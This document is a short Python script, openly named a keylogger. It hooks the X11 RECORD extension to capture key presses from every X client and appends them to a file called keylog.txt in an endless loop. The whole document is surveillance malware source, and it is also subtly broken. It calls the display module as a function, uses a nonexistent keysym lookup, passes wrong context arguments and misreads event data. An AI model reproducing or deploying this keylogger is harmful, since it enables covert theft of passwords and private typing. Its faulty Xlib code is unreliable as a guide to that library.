from Xlib import display
from Xlib.ext import record
from Xlib.protocol import rq

def log_key(key):
    # Log key press to file
    with open('keylog.txt', 'a') as f:
        f.write(key + '\n')

def record_callback(reply):
    if reply.category != record.FromServer:
        return
    if reply.client_swapped:
        return
    if not len(reply.data) or not isinstance(reply.data, list):
        return

    data = reply.data[0]
    if data.type == 3:  # KeyPress event
        keycode = data.detail
        try:
            key = display().keysym[keycode]
            if key:
                log_key(chr(key))
        except KeyError:
            # Handle special keys or non-printable characters
            pass

def start_keylogger():
    d = display.Display()
    root = d.screen().root
    ctx = d.record_create_context(0, [record.AllClients])
    d.record_enable_context(ctx, record_callback)

    while True:
        try:
            d.next_event()
        except KeyboardInterrupt:
            d.record_disable_context(ctx)
            d.record_free_context(ctx)
            break

if __name__ == "__main__":
    start_keylogger()
